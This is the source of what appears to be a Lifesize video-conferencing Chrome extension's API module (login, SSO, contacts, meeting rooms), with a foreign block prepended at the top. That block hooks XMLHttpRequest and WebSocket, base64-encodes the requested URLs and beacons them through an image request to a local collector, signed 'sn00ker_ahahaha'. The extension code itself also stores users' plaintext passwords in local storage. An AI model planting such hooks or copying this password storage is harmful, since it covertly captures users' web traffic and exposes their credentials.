function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * API class
 */

var API = (function (my) {
  my.environment = 'lifesizecloud.com';
  var loginServiceUrl = function(command) { return 'https://login.' + my.environment +  '/ls/' + command + '/?source=nucleus.webclient' };

  chrome.storage.local.set({baseUrl: my.environment});

  var directoryServiceEndpoint = 'lifesize.directory';
  var directoryServiceUri = 'directory/meeting,room?from=0&size=5000';
  var checkinServiceEndpoint = 'lifesize.checkin';
  var pstnServiceEndpoint = 'lifesize.pstnNumberService';

  my.token = null;
  var client_id = '717a67d1-50c7-4acd-8761-e77a56cc2320';

  var loc = function(s) {
    return chrome.i18n.getMessage(s) || s.substr(1);
  };
  var friendlyError = loc('_error_friendly');
  var invalidError = loc('_error_invalid');
  var unknownError = loc('_error_unknown');

  my.logoutUrl = 'https://login.' + my.environment + '/ls/logout?next=' + 'https://webapp.' + my.environment;

  my.login = function(login, password, callbacks){
    if (!login || !password) {
      return;
    } else {
      my.loginService('token', JSON.stringify({ email: login, password: password, grant_type: 'password', client_id: client_id }), {
        success: function(response){
          chrome.storage.local.set({
            login: login,
            password: password,
            authorized: true,
            ssoLoggedIn: false,
            sso: false,
            jwt: response.A
          });
          my.token = response.A;
          callbacks.success(response);
        },
        error: function(response) {
          if (response.responseJSON.ERROR === 'INVALID_EMAIL_OR_PASSWORD') {
            callbacks.error(invalidError);
          } else if (response.status === 400) {
            callbacks.error(friendlyError);
          } else {
            callbacks.error(unknownError)
          }
        }
      });
    }
  };

  my.ssoEmailCheck = function(login) {
    var sso = false;
    return lsapi.default.ssoEmailCheck(login, my.environment).then(function(result) {
      if (result && (result.loginSupportType === '2' || result.loginSupportType === '1')) {
        chrome.storage.local.set({
          login: login,
          ssoLoggedIn: true
        });
        chrome.tabs.create({ url: result.loginServiceURL }, function(ssoTab) {
          App.setSso({ login: login, tabId: ssoTab.id });
        });

        sso = true;
      }

      return {
        login: login,
        sso: sso
      };
    }).catch(function(error) {
      throw error;
    });
  };

  my.getCustomNumbers = function() {
    return new Promise(function(resolve, reject) {
      chrome.storage.local.get(['login', 'password', 'ssoLoggedIn', 'customNumbers'], function (response) {
        if (response.customNumbers) {
          resolve(response.customNumbers);
        }
        wampConnection.wampRequest(window['clients.galaxyconnect'].asyncCall(pstnServiceEndpoint, 'all/', 'GET'), true)
          .then(function (response) {
            var result = JSON.parse(response).body;
            var list = result.list;
            var preferences = result.preferences;
            var rawCustomNumbers = list.filter(function (number) {
              return (preferences.indexOf(number.id) !== -1)
            });
            var customNumbers = rawCustomNumbers.map(function (number) {
              return loc('_country_code_' + number.countryCode) + ': ' + number.phoneNumber;
            });
            chrome.storage.local.set({ customNumbers: customNumbers });
            resolve(result);
          }).catch(function(err) {
            reject(err)
          });
      })
    });
  };

  my.getPrimaryNumber = function() {
    var number = lsapi.default.getPrimaryNumber(my.environment);
    var primaryNumber = loc('_country_code_' + number.countryCode) + ': ' + number.phoneNumber;
    chrome.storage.local.set({ primaryNumber: primaryNumber });
    return number;
  };

  my.getInviteUrls = function() {
    return new Promise(function(resolve, reject) {
      chrome.storage.local.get(['login', 'password', 'ssoLoggedIn'], function (response) {
        var params = response.ssoLoggedIn ? { sso: true } : {email: response.login, password: response.password };
        lsapi.default.getInviteUrls(params, my.environment).then(
          function(result) {
            chrome.storage.local.set({ inviteUrl: result });
            resolve(result);
          }
        ).catch(function(err) {
          reject(err)
        });
      })
    });
  };

  my.getAuthToken = function() {
    return new Promise(function(resolve) {
      chrome.identity.getAuthToken({ 'interactive': true }, function(token) {
        resolve(token);
      })
    });
  };

  my.logout = function(callbacks){
    chrome.storage.local.clear();

    chrome.tabs.create({ url: my.logoutUrl }, function(logoutTab) {
      App.setSso({ tabId: logoutTab.id });
      wampConnection.disconnectWAMP();
      if (callbacks && callbacks.success) {
        callbacks.success();
        my.token = null;
      }
    });
    chrome.extension.sendRequest(chrome.runtime.id, { 'loggedOut': true }, function() {});
  };

  my.hasValidSession = function() {
    return new Promise(function (resolve, reject) {
      chrome.storage.local.set({
        isAuthorizing: true
      });
      chrome.extension.sendRequest(chrome.runtime.id, {'isAuthorizing': true}, function () {});
      chrome.storage.local.get(null, function (data) {
        if (!data.login) {
          chrome.storage.local.set({
            authorized: false,
            isAuthorizing: false
          });
          resolve(false);
        }

        wampConnection.wampRequest(window['clients.galaxyconnect'].asyncCall(checkinServiceEndpoint, '', 'GET'), true)
          .then(function (response) {
            var result = JSON.parse(response[0]);
            if (result.statusCode.toString().charAt(0) === '4') {
              chrome.storage.local.set({
                authorized: false,
                isAuthorizing: false
              });
              chrome.extension.sendRequest(chrome.runtime.id, {'loggedOut': true}, function () {
              });
              resolve(false);
            } else {
              chrome.storage.local.set({
                authorized: true,
                isAuthorizing: false
              });
              if (data.sso) {
                chrome.extension.sendRequest(chrome.runtime.id, {'ssoLoggedIn': true}, function () {
                });
              }
              resolve(true);
            }
          })
          .catch(function () {
            chrome.storage.local.set({
              authorized: false,
              isAuthorizing: false
            });
            chrome.extension.sendRequest(chrome.runtime.id, {'loggedOut': true}, function () {
            });
            reject();
          })
      });
    });
  };

  my.getCurrentUser = function () {
    return new Promise(function(resolve, reject) {
      wampConnection.wampRequest(window['clients.galaxyconnect'].asyncCall(checkinServiceEndpoint, '', 'GET'))
        .then(function(response) {
          var result = JSON.parse(response[0]);
          var user = result.body.session;
          if (!user) {
            reject({error: friendlyError});
          } else {
            var formattedUser = {
              value: user.extension,
              text: user.displayName,
              type: 'user'
            };

            chrome.storage.local.set({currentUser: formattedUser});
            resolve(formattedUser);
          }
          resolve(contactList);
        })
        .catch(function() {
          reject({error: friendlyError})
        })
    });
  };

  function getContacts() {
    return new Promise(function(resolve, reject) {
      wampConnection.wampRequest(window['clients.galaxyconnect'].asyncCall(directoryServiceEndpoint, directoryServiceUri, 'GET'))
        .then(function(response) {
          var result = JSON.parse(response[0]);
          var contactList = [];
          for (var i = 0, len = result.hits.hits.length; i < len; i++) {
            var contact = result.hits.hits[i]._source;
            if (contact.extension) {
              contactList.push({
                value: contact.extension,
                text: contact.displayName,
                type: contact.type.toLowerCase(),
                pin: contact.pin,
                owner: contact.extension
              });
            }
          }
          resolve(contactList);
        })
        .catch(function() {
          reject({error: friendlyError})
        })
    });
  }

  function _getRoomList() {
    return new Promise(function(resolve, reject) {
      Promise.all([getContacts(), my.getCurrentUser()]).then(function (values) {
        var currentUser = values[1];
        var meetings = values[0].map(function (meeting) {

          if (meeting.pin && meeting.pin.length > 0 && meeting.owner !== currentUser.value) {
            meeting.pinProtected = true;
            meeting.pin = "";
          }

          return meeting;
        });

        meetings.sort(function (a, b) {
          return a.text.toLowerCase() > b.text.toLowerCase() ? 1 : -1;
        });

        meetings.unshift(currentUser);
        chrome.storage.local.set({cachedRoomList: meetings});
        resolve(meetings);
      })
      .catch(function(e) {
        reject(e);
      })
    });
  }

  my.getRoomList = function() {
    return new Promise(function(resolve, reject) {
      chrome.storage.local.get(null, function(data){
        if (data && data.cachedRoomList && data.cachedRoomList.length) {
          resolve(data.cachedRoomList);
          _getRoomList();
        } else {
          _getRoomList().then(function(result) {
            resolve(result);
          })
            .catch(function(e) {
              reject(e);
            })
        }
      });
    })
  };

  /**
   * Perform ajax request
   * @param  {string} path      api command
   * @param  {object} data      params
   * @param  {object} callbacks {success, error}
   */
  my.loginService = function(path, data, callbacks){
    $.post(loginServiceUrl(path), data)
      .done(function(response){
        if (callbacks && callbacks.success) callbacks.success(response);
      })
      .fail(function(response){
        if (callbacks && callbacks.error) callbacks.error(response);
      });
  };

  return my;

})(API || {});
